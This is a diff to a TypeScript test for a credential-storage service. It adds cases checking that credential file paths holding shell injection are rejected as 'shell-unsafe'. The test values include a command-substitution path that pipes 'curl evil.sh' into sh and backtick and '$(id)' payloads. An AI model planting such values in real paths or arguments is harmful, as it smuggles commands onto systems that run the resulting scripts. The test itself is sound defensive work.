@@ -503,6 +503,32 @@ test("file bundles: one item per service, materialize to a /tmp script with env 
     "paths must be home-relative",
   );
 
+  for (const path of [
+    ".config/gh/$(curl evil.sh|sh)",
+    ".aws/`id`",
+    '.kube/"$(id)"',
+    ".docker/con\\fig.json",
+    "line1\nline2",
+  ]) {
+    await assert.rejects(
+      k.save({ ownerId: "U1", service: "evil", files: [{ path, contentBase64: b64("x") }] }),
+      (e: KeychainError) => e.status === 400 && /shell-unsafe/.test(e.message),
+      `shell-unsafe path rejected: ${JSON.stringify(path)}`,
+    );
+    assert.throws(
+      () =>
+        renderUseScript({
+          kind: "file",
+          credentialId: "cred-legacy",
+          ownerId: "U1",
+          service: "evil",
+          files: [{ path, contentBase64: b64("x") }],
+        }),
+      /shell-unsafe/,
+      `a legacy row with a shell-unsafe path never reaches the shell: ${JSON.stringify(path)}`,
+    );
+  }
+
   const grant = await k.createGrant({
     credentialId: cred.id,
     ownerId: "U1",
